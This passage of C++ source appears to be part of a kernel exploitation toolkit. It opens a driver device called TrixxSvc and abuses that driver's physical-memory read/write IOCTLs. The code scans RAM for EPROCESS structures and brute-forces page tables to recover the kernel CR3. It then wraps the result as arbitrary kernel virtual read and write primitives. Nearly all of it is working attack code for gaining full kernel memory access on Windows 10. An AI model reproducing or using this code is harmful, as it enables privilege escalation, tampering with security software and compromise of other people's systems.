    // forces MmCached, which matches the existing mapping and succeeds.
    bool wbPatched = TrixxPatchCachedReads(h, ranges, ntkrnlVA, diag);
    if (wbPatched)
        dlog("[+] MmCached IAT patch active — page table reads enabled\n");
    else
        dlog("[!] MmCached IAT patch failed — page table walks will likely fail\n");

    // NtBuildNumber VA for post-walk verification
    uint64_t nbVA = 0;
    {
        HMODULE hNb = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (hNb) {
            auto* pNB = (uint8_t*)GetProcAddress(hNb, "NtBuildNumber");
            if (pNB) nbVA = ntkrnlVA + (uint64_t)(pNB - (uint8_t*)hNb);
            FreeLibrary(hNb);
        }
    }
    if (nbVA) dlog("[*] NtBuildNumber VA=0x%llx\n", nbVA);

    auto countPML4 = [&](uint64_t c) -> int {
        int count = 0;
        for (int i = 256; i < 512; i++) {
            uint64_t e = TrixxRead8(h, (c & PTE_ADDR_MASK) + i * 8);
            if (e & 1) count++;
        }
        return count;
    };

    // Win10 19045 EPROCESS offsets (from KPROCESS base)
    const uint32_t EP_DTB  = 0x028;
    const uint32_t EP_PID  = 0x440;
    const uint32_t EP_NAME = 0x5A8;

    // Functional validation: walk ntkrnlVA, check MZ + NtBuildNumber
    auto validateCR3 = [&](uint64_t candidate) -> bool {
        uint64_t pa = TrixxVirtToPhysSafe(h, candidate, ntkrnlVA, ranges);
        if (!pa || !IsInSafeRange(pa, ranges)) return false;
        uint16_t mz = 0;
        TrixxPhysRead(h, pa, &mz, 2);
        if (mz != 0x5A4D) return false;
        if (nbVA) {
            uint64_t nbPA = TrixxVirtToPhysSafe(h, candidate, nbVA, ranges);
            if (nbPA && IsInSafeRange(nbPA, ranges)) {
                uint32_t nbVal = 0;
                TrixxPhysRead(h, nbPA, &nbVal, 4);
                uint32_t bc = nbVal & 0xFFFF;
                if (bc < 7600 || bc > 30000) return false;
            }
        }
        return true;
    };

    uint64_t cr3 = 0;

    // ════════════════════════════════════════════════════════════
    // Phase 1: EPROCESS physical scan (no page table walks needed)
    // Scan all RAM for EPROCESS structures matching known offsets.
    // Collect System (PID=4) AND other processes for more DTB candidates.
    // ════════════════════════════════════════════════════════════
    dlog("[*] Phase1: EPROCESS scan (PID+Name pattern, all processes)\n");

    struct EPMatch {
        uint64_t epPA;
        uint64_t pid;
        uint64_t dtb;
        char name[16];
    };
    std::vector<EPMatch> epMatches;

    for (size_t r = 0; r < ranges.size(); r++) {
        uint64_t lo = (ranges[r].lo + 0xFFF) & ~0xFFFULL;
        uint64_t hi = ranges[r].hi & ~0xFFFULL;
        if (lo >= hi) continue;
        dlog("[*]   Phase1 range %zu: 0x%llx-0x%llx\n", r, lo, hi);

        for (uint64_t pa = lo; pa < hi; pa += 0x1000) {
            if ((pa & 0x3FFFFFF) == 0)
                dlog("[*]   Phase1: 0x%llx\n", (unsigned long long)pa);

            // Scan offsets where PID field (EP+0x440) could be in this page.
            // EPROCESS base must also be in this page (off >= 0x440) so we
            // can read Type and DTB without crossing page boundaries.
            for (uint16_t off = 0x440; off <= 0xA00; off += 0x10) {
                uint64_t pid = 0;
                if (!TrixxPhysRead(h, pa + off, &pid, 8)) continue;
                if (pid < 1 || pid > 65536) continue;

                uint64_t epBase = pa + off - EP_PID;

                // DISPATCHER_HEADER.Type == 3 (ProcessObject)
                uint8_t type = 0;
                TrixxPhysRead(h, epBase, &type, 1);
                if (type != 3) continue;

                // ActiveProcessLinks.Flink must be canonical kernel VA
                uint64_t flink = 0;
                TrixxPhysRead(h, epBase + 0x448, &flink, 8);
                if ((flink >> 47) != 0x1FFFF) continue;

                // ImageFileName: null-terminated printable ASCII, >= 2 chars
                char nm[16] = {};
                TrixxPhysReadBulk(h, epBase + EP_NAME, nm, 15);
                nm[15] = 0;
                bool nameOk = false;
                int nameLen = 0;
                for (int i = 0; i < 15; i++) {
                    if (nm[i] == 0) { nameOk = (i >= 2); nameLen = i; break; }
                    if (nm[i] < 0x20 || nm[i] > 0x7E) break;
                }
                if (!nameOk) continue;

                // DTB: page-aligned, in safe physical range
                uint64_t dtbRaw = 0;
                TrixxPhysRead(h, epBase + EP_DTB, &dtbRaw, 8);
                uint64_t dtb = dtbRaw & ~0xFFFULL;
                if (!dtb || (dtbRaw >> 52) || !IsInSafeRange(dtb, ranges)) continue;

                EPMatch m = {};
                m.epPA = epBase;
                m.pid = pid;
                m.dtb = dtb;
                memcpy(m.name, nm, 15);
                epMatches.push_back(m);

                dlog("[+] Phase1: %.15s PID=%llu EP=0x%llx DTB=0x%llx\n",
                     nm, (unsigned long long)pid,
                     (unsigned long long)epBase, (unsigned long long)dtb);
            }
        }
    }
    dlog("[*] Phase1: %zu EPROCESS matches found\n", epMatches.size());

    // Sort: System (PID=4) first, then by PID ascending
    std::sort(epMatches.begin(), epMatches.end(), [](const EPMatch& a, const EPMatch& b) {
        if (a.pid == 4 && b.pid != 4) return true;
        if (a.pid != 4 && b.pid == 4) return false;
        return a.pid < b.pid;
    });

    // Flush CPU caches: dirty page table entries written back to DRAM
    dlog("[*] Pre-walk cache flush (128MB)\n");
    TrixxFlushCaches();

    // ════════════════════════════════════════════════════════════
    // Phase 2: DTB walk — UC reads on flushed DRAM see correct PTEs
    // Try each EPROCESS DTB ±8 KPTI companions.
    // ════════════════════════════════════════════════════════════
    if (!cr3 && !epMatches.empty()) {
        dlog("[*] Phase2: validating %zu DTBs with ±8 companions\n", epMatches.size());

        for (auto& m : epMatches) {
            for (int d = -8; d <= 8; d++) {
                uint64_t tryDTB = m.dtb + (int64_t)d * 0x1000;
                if (!tryDTB || !IsInSafeRange(tryDTB, ranges)) continue;

                if (validateCR3(tryDTB)) {
                    int pml4 = countPML4(tryDTB);
                    dlog("[+] Phase2: CR3=0x%llx (d=%+d from %.15s PID=%llu EP=0x%llx) PML4=%d\n",
                         (unsigned long long)tryDTB, d, m.name,
                         (unsigned long long)m.pid,
                         (unsigned long long)m.epPA, pml4);
                    cr3 = tryDTB;
                    break;
                }
            }
            if (cr3) break;
        }

        // Diagnostic dump if no DTB worked
        if (!cr3 && !epMatches.empty()) {
            EPMatch* sysMatch = nullptr;
            EPMatch* explorerMatch = nullptr;
            for (auto& m : epMatches) {
                if (m.pid == 4 && memcmp(m.name, "System", 6) == 0) sysMatch = &m;
                if (memcmp(m.name, "explorer.exe", 12) == 0) explorerMatch = &m;
            }
            // Dump up to 2 processes' DTBs for comparison
            EPMatch* diags[] = { sysMatch, explorerMatch };
            const char* diagNames[] = { "System", "explorer" };
            for (int di = 0; di < 2; di++) {
                if (!diags[di]) continue;
                auto& m0 = *diags[di];
                dlog("[*] Phase2 diag %s: DTB=0x%llx PID=%llu\n",
                     diagNames[di], (unsigned long long)m0.dtb, (unsigned long long)m0.pid);
                // Scan ALL 512 PML4 entries, print non-zero ones
                int nonZero = 0;
                for (int ki = 0; ki < 512; ki++) {
                    uint64_t e = TrixxRead8(h, m0.dtb + ki * 8);
                    if (e != 0) {
                        dlog("[*]   PML4[%d]=0x%llx\n", ki, (unsigned long long)e);
                        nonZero++;
                    }
                }
                dlog("[*]   (%d/512 non-zero entries)\n", nonZero);
                // Also try DTB +/- 0x1000 (KPTI companion)
                for (int kd = -1; kd <= 1; kd += 2) {
                    uint64_t altDTB = m0.dtb + kd * 0x1000;
                    if (!altDTB) continue;
                    uint64_t eNtk = TrixxRead8(h, altDTB + ntkrnlPml4Idx * 8);
                    if (eNtk) {
                        dlog("[*]   DTB%+d: PML4[%d]=0x%llx (non-zero!)\n",
                             kd, ntkrnlPml4Idx, (unsigned long long)eNtk);
                    }
                }
            }
            // Diagnose: is MmMapIoSpace FAILING for page table PAs?
            if (sysMatch) {
                uint64_t v1 = 0xDEAD, v2 = 0xDEAD, v3 = 0xDEAD;
                bool ok1 = TrixxPhysRead(h, sysMatch->dtb, &v1, 8);
                bool ok2 = TrixxPhysRead(h, sysMatch->dtb + ntkrnlPml4Idx * 8, &v2, 8);
                bool ok3 = TrixxPhysRead(h, sysMatch->epPA + EP_NAME, &v3, 8);
                dlog("[*] Read status: DTB@0=%s(0x%llx) DTB@PML4=%s(0x%llx) EP@name=%s(0x%llx)\n",
                     ok1?"OK":"FAIL", (unsigned long long)v1,
                     ok2?"OK":"FAIL", (unsigned long long)v2,
                     ok3?"OK":"FAIL", (unsigned long long)v3);
                // Also read the raw DTB value from EPROCESS to check PCID bits
                uint64_t dtbRaw = 0;
                TrixxPhysRead(h, sysMatch->epPA + EP_DTB, &dtbRaw, 8);
                dlog("[*] System raw DTB=0x%llx (masked=0x%llx)\n",
                     (unsigned long long)dtbRaw, (unsigned long long)(dtbRaw & ~0xFFFULL));
                // Try reading a known-good PA for comparison
                uint64_t pa0 = 0;
                bool ok0 = TrixxPhysRead(h, 0, &pa0, 8);
                dlog("[*] PA@0x0: %s val=0x%llx\n", ok0?"OK":"FAIL", (unsigned long long)pa0);
            }
        }
    }

    // ════════════════════════════════════════════════════════════
    // Phase 3: Self-referencing PTE scan
    // Scan for PML4 pages where one entry points back to the page
    // itself (Windows recursive mapping). WB reads see correct entries.
    // ════════════════════════════════════════════════════════════
    if (!cr3) {
        dlog("[*] Pre-Phase3 cache flush\n");
        TrixxFlushCaches();
        dlog("[*] Phase3: self-referencing PTE scan\n");

        for (size_t r = 0; r < ranges.size() && !cr3; r++) {
            uint64_t lo = (ranges[r].lo + 0xFFF) & ~0xFFFULL;
            uint64_t hi = ranges[r].hi & ~0xFFFULL;
            for (uint64_t pa = lo; pa < hi && !cr3; pa += 0x1000) {
                if ((pa & 0x3FFFFFF) == 0)
                    dlog("[*]   Phase3: 0x%llx\n", (unsigned long long)pa);

                // Quick pre-filter: PML4[ntkrnlPml4Idx] must be present
                uint64_t ntkE = TrixxRead8(h, pa + ntkrnlPml4Idx * 8);
                if (!(ntkE & 1)) continue;
                uint64_t target = ntkE & PTE_ADDR_MASK;
                if (!target || target >= maxPhys) continue;

                // Check for self-referencing entry in kernel half
                for (int idx = 256; idx < 512; idx++) {
                    uint64_t e = TrixxRead8(h, pa + idx * 8);
                    if (!(e & 1)) continue;
                    if ((e & PTE_ADDR_MASK) != pa) continue;

                    // Self-ref found — validate with ntkrnlVA walk
                    if (validateCR3(pa)) {
                        int pml4 = countPML4(pa);
                        dlog("[+] Phase3: self-ref CR3=0x%llx idx=%d PML4=%d\n",
                             (unsigned long long)pa, idx, pml4);
                        cr3 = pa;
                    }
                    break;
                }
            }
        }
        if (!cr3) dlog("[-] Phase3: no self-referencing PML4 found\n");
    }

    // ════════════════════════════════════════════════════════════
    // Phase 4: Brute-force PML4 scan
    // Try every page as CR3, walk ntkrnlVA, check for MZ.
    // ════════════════════════════════════════════════════════════
    if (!cr3) {
        dlog("[*] Pre-Phase4 cache flush\n");
        TrixxFlushCaches();
        dlog("[*] Phase4: brute-force PML4 scan\n");

        for (size_t r = 0; r < ranges.size() && !cr3; r++) {
            uint64_t lo = (ranges[r].lo + 0xFFF) & ~0xFFFULL;
            uint64_t hi = ranges[r].hi & ~0xFFFULL;
            if (lo >= hi) continue;
            dlog("[*]   Phase4 range %zu: 0x%llx-0x%llx\n", r, lo, hi);

            for (uint64_t pa = lo; pa < hi && !cr3; pa += 0x1000) {
                if ((pa & 0xFFFFFFF) == 0)
                    dlog("[*]   Phase4: 0x%llx\n", (unsigned long long)pa);

                // Quick filter: PML4[ntkrnlPml4Idx] present + PML4[495] (KSD) present
                uint64_t ntkE = TrixxRead8(h, pa + ntkrnlPml4Idx * 8);
                if (!(ntkE & 1)) continue;
                uint64_t ksdE = TrixxRead8(h, pa + 495 * 8);
                if (!(ksdE & 1)) continue;

                if (validateCR3(pa)) {
                    int pml4 = countPML4(pa);
                    dlog("[+] Phase4: CR3=0x%llx PML4=%d\n",
                         (unsigned long long)pa, pml4);
                    cr3 = pa;
                }
            }
        }
        if (!cr3) dlog("[-] Phase4: no CR3 found via brute-force\n");
    }

    // KPTI upgrade: if CR3 is user-mode (sparse kernel entries), try companion
    if (cr3) {
        int myCount = countPML4(cr3);
        dlog("[*] KPTI check: CR3=0x%llx PML4=%d/256\n", (unsigned long long)cr3, myCount);
        if (myCount < 200) {
            for (int d = -8; d <= 8; d++) {
                if (d == 0) continue;
                uint64_t alt = cr3 + (int64_t)d * 0x1000;
                if (!IsInSafeRange(alt, ranges)) continue;
                int altCount = countPML4(alt);
                if (altCount > myCount && altCount >= 200 && validateCR3(alt)) {
                    dlog("[+] KPTI upgrade: 0x%llx (%d entries) -> 0x%llx (%d entries)\n",
                         (unsigned long long)cr3, myCount,
                         (unsigned long long)alt, altCount);
                    cr3 = alt;
                    break;
                }
            }
        }
    }

    if (diag) fclose(diag);
    std::cout << "[+] CR3 at phys 0x" << std::hex << cr3 << std::dec << "\n";
    return cr3;
}

// ── Virtual R/W (chunked to 1/2/4/8-byte physical IOCTLs) ───────
static bool TrixxVirtRead(HANDLE h, uint64_t cr3, uint64_t va, void* dst, size_t n) {
    auto* d = (uint8_t*)dst;
    while (n) {
        uint64_t pa = TrixxVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        size_t off = 0;
        while (off + 8 <= chunk) {
            if (!TrixxPhysRead(h, pa + off, d + off, 8)) return false;
            off += 8;
        }
        if (off + 4 <= chunk) {
            if (!TrixxPhysRead(h, pa + off, d + off, 4)) return false;
            off += 4;
        }
        if (off + 2 <= chunk) {
            if (!TrixxPhysRead(h, pa + off, d + off, 2)) return false;
            off += 2;
        }
        if (off < chunk) {
            if (!TrixxPhysRead(h, pa + off, d + off, 1)) return false;
            off++;
        }
        va += chunk; d += chunk; n -= chunk;
    }
    return true;
}

static bool TrixxVirtWrite(HANDLE h, uint64_t cr3, uint64_t va, const void* src, size_t n) {
    const auto* s = (const uint8_t*)src;
    while (n) {
        uint64_t pa = TrixxVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        size_t off = 0;
        while (off + 8 <= chunk) {
            if (!TrixxPhysWrite(h, pa + off, s + off, 8)) return false;
            off += 8;
        }
        if (off + 4 <= chunk) {
            if (!TrixxPhysWrite(h, pa + off, s + off, 4)) return false;
            off += 4;
        }
        if (off + 2 <= chunk) {
            if (!TrixxPhysWrite(h, pa + off, s + off, 2)) return false;
            off += 2;
        }
        if (off < chunk) {
            if (!TrixxPhysWrite(h, pa + off, s + off, 1)) return false;
            off++;
        }
        va += chunk; s += chunk; n -= chunk;
    }
    return true;
}

// ── Session + KernelPrimitives factory ───────────────────────────
struct TrixxSession {
    HANDLE dev = INVALID_HANDLE_VALUE;
    uint64_t cr3 = 0;
};

inline KernelPrimitives OpenTrixx(std::string& err)
{
    HANDLE h = INVALID_HANDLE_VALUE;
    for (int retry = 0; retry < 5; ++retry) {
        h = CreateFileW(L"\\\\.\\TrixxSvc",
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE) break;
        if (retry < 4) Sleep(500);
    }
    if (h == INVALID_HANDLE_VALUE) {
        err = "OpenTrixx: CreateFile failed err=" + std::to_string(GetLastError()) +
              " (TrixxSvc service loaded?)";
        return {};
    }

    uint32_t smoke = 0;
    if (!TrixxPhysRead(h, 0x1000, &smoke, 4)) {
        CloseHandle(h);
        err = "OpenTrixx: smoke test read failed (IOCTL rejected)";
        return {};
    }

    uint64_t cr3 = TrixxBootstrapCR3(h);
    if (!cr3) {
        CloseHandle(h);
        err = "OpenTrixx: CR3 bootstrap failed (no valid PML4 found)";
        return {};
    }

    std::cout << "[+] TRIXX opened, CR3=0x" << std::hex << cr3 << std::dec << "\n";

    auto sp = std::make_shared<TrixxSession>();
    sp->dev = h;
    sp->cr3 = cr3;

    KernelPrimitives p;

    p.ReadKernelMemory = [sp](void* dst, uint64_t src, size_t sz) -> bool {
        return TrixxVirtRead(sp->dev, sp->cr3, src, dst, sz);
    };

    p.WriteKernelMemory = [sp](uint64_t dst, const void* src, size_t sz) -> bool {
        return TrixxVirtWrite(sp->dev, sp->cr3, dst, src, sz);
    };

    p.AllocateKernelMemory = nullptr;

    p.ReadPhysicalMemory = [sp](void* dst, uint64_t pa, size_t sz) -> bool {
        return TrixxPhysRead(sp->dev, pa, dst, (uint32_t)sz);
    };
    p.cr3 = cr3;
    p.UpdateCR3 = [sp](uint64_t newCr3) { sp->cr3 = newCr3; };

    return p;
}
